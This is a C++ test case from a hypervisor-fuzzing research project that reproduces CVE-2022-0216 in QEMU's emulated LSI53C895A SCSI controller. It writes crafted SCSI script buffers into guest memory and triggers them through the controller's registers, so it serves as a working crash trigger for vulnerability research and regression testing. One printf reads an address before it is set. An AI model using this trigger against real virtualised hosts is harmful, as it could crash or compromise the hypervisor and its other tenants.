#include "tests.h"

// original written by Weihe Di <diweihehhh@gmail.com>
// modified by Qiang Liu <cyruscyliu@gmail.com>

// retake a snapshot with the following configuration of L2 VM
//
// wget https://download.qemu.org/qemu-6.1.0.tar.bz
// tar xf qemu-6.1.0.tar.bz
// cd qemu-6.1.0
// mkdir build; cd build
// ../configure --target-list=x86_64-softmmu --enable-sanitizers
// qemu-6.1.0/build/qemu-system-x86_64 \
//     -machine type=q35,accel=kvm -cpu host -m 4G \
//     -hda /path/to/debian_or_ubuntu.qcow2 \
//     -device lsi53c895a,id=scsi \
//     -device scsi-hd,drive=disk0 \
//     -drive file=null-co://,id=disk0,if=none,format=raw
//
// command line to run HyperPill
//
// export PROJECT_ROOT=/path/to/HyperPill
// export SNAPSHOT_BASE=/path/to/snapshots/dir
// export MANUAL_RANGES=$SNAPSHOT_BASE/mtree
// export RANGE_REGEX="nvme"
// KVM=1 $PROJECT_ROOT/tests/run_hyperpill.sh cve-2022-0216

// original asan report:

#define lsi_base                0xC000 // FIXME
#define first_buf           0x13AC8000 // FIXME, better be page aligned
#define second_buf          0x13BC9000 // FIXME, better be page aligned
#define second_buf_1        0x13CCA000 // FIXME, better be page aligned
#define second_buf_2        0x13DCB000 // FIXME, better be page aligned
#define third_buf           0x13ECC000 // FIXME, better be page aligned
#define third_buf_1         0x13FCD000 // FIXME, better be page aligned
#define third_buf_2         0x140CE000 // FIXME, better be page aligned

extern "C" int LLVMFuzzerInitialize(int *argc, char ***argv);

int main(int argc, char **argv) {
    LLVMFuzzerInitialize(&argc, &argv);

    // part 1
    uint8_t buf1[0x50] = {
        0x08, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x06, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x01, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x04, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00
    };
    bx_phy_address first_buf_hpa;
    gpa2hpa(first_buf, &first_buf_hpa, NULL); // GPA->HPA
    printf("first_buf: GPA=0x%lx HPA=0x%lx\n", (unsigned long)first_buf, first_buf_hpa);
    test_mem_write(first_buf_hpa, 0x50, buf1);

    test_out(lsi_base + 0x2c + 0, 0, (first_buf >> (0 * 8)) & 0xFF);
    test_out(lsi_base + 0x2c + 1, 0, (first_buf >> (1 * 8)) & 0xFF);
    test_out(lsi_base + 0x2c + 2, 0, (first_buf >> (2 * 8)) & 0xFF);
    test_out(lsi_base + 0x2c + 3, 0, (first_buf >> (3 * 8)) & 0xFF);

    // part 2
    uint8_t buf2[12] = {
        0x00, 0x00, 0x01, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x22
    };

    bx_phy_address second_buf_hpa, second_buf_1_hpa, second_buf_2_hpa;
    gpa2hpa(second_buf, &second_buf_hpa, NULL); // GPA->HPA
    printf("second_buf: GPA=0x%lx HPA=0x%lx\n", (unsigned long)second_buf, second_buf_hpa);
    test_mem_write(second_buf_hpa, 12, buf2);

    test_mem_write_up_to_8(second_buf_hpa + 12, 4, second_buf_1);
    gpa2hpa(second_buf_1, &second_buf_1_hpa, NULL); // GPA->HPA
    printf("second_buf_1: GPA=0x%lx HPA=0x%lx\n", (unsigned long)second_buf_1, second_buf_1_hpa);
    test_mem_write_up_to_8(second_buf_1_hpa, 4, second_buf_2);
    printf("second_buf_2: GPA=0x%lx HPA=0x%lx\n", (unsigned long)second_buf_2, second_buf_2_hpa);
    gpa2hpa(second_buf_2, &second_buf_2_hpa, NULL); // GPA->HPA
    test_mem_write_up_to_8(second_buf_2_hpa, 1, 0x41);

    test_out(lsi_base + 0x2c + 0, 0, (second_buf >> (0 * 8)) & 0xFF);
    test_out(lsi_base + 0x2c + 1, 0, (second_buf >> (1 * 8)) & 0xFF);
    test_out(lsi_base + 0x2c + 2, 0, (second_buf >> (2 * 8)) & 0xFF);
    test_out(lsi_base + 0x2c + 3, 0, (second_buf >> (3 * 8)) & 0xFF);

    // part 3
    uint8_t buf3[12] = {
        0x08, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x26
    };

    bx_phy_address third_buf_hpa, third_buf_1_hpa, third_buf_2_hpa;
    gpa2hpa(third_buf, &third_buf_hpa, NULL);
    printf("thrid_buf: GPA=0x%lx HPA=0x%lx\n", (unsigned long)third_buf, third_buf_hpa);
    test_mem_write(third_buf_hpa, 12, buf3);

    test_mem_write_up_to_8(third_buf_hpa + 12, 4, third_buf_1);
    gpa2hpa(third_buf_1, &third_buf_1_hpa, NULL);
    printf("thrid_buf_1: GPA=0x%lx HPA=0x%lx\n", (unsigned long)third_buf_1, third_buf_1_hpa);
    test_mem_write_up_to_8(third_buf_1_hpa, 4, third_buf_2);
    gpa2hpa(third_buf_2, &third_buf_2_hpa, NULL);
    printf("thrid_buf_2: GPA=0x%lx HPA=0x%lx\n", (unsigned long)third_buf_2, third_buf_2_hpa);
    test_mem_write_up_to_8(third_buf_2_hpa + 0, 1, 0x0c);
    test_mem_write_up_to_8(third_buf_2_hpa + 1, 1, 0x80);
    test_mem_write_up_to_8(third_buf_2_hpa + 2, 1, 0x0d);

    test_out(lsi_base + 0x2c + 0, 0, (third_buf >> (0 * 8)) & 0xFF);
    test_out(lsi_base + 0x2c + 1, 0, (third_buf >> (1 * 8)) & 0xFF);
    test_out(lsi_base + 0x2c + 2, 0, (third_buf >> (2 * 8)) & 0xFF);
    test_out(lsi_base + 0x2c + 3, 0, (third_buf >> (3 * 8)) & 0xFF);
}